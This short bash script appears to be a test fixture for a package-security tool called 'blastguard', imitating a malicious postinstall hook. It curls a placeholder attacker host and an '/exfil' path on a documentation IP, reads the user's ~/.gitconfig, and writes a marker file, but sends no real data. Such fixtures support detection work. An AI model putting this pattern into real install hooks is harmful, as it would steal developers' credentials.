#!/bin/bash
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Rafael Roquetto

set +e

curl -s -o /dev/null --max-time 2 http://attacker.example.invalid/ 2>/dev/null
curl -s -o /dev/null --max-time 2 http://203.0.113.42/exfil 2>/dev/null

[ -f "$HOME/.gitconfig" ] && cat "$HOME/.gitconfig" > /dev/null

echo "# blastguard test marker" >> /tmp/test.gitconfig

python3 -c "print('evil postinstall done')" 2>/dev/null
echo "evil-helper postinstall finished"
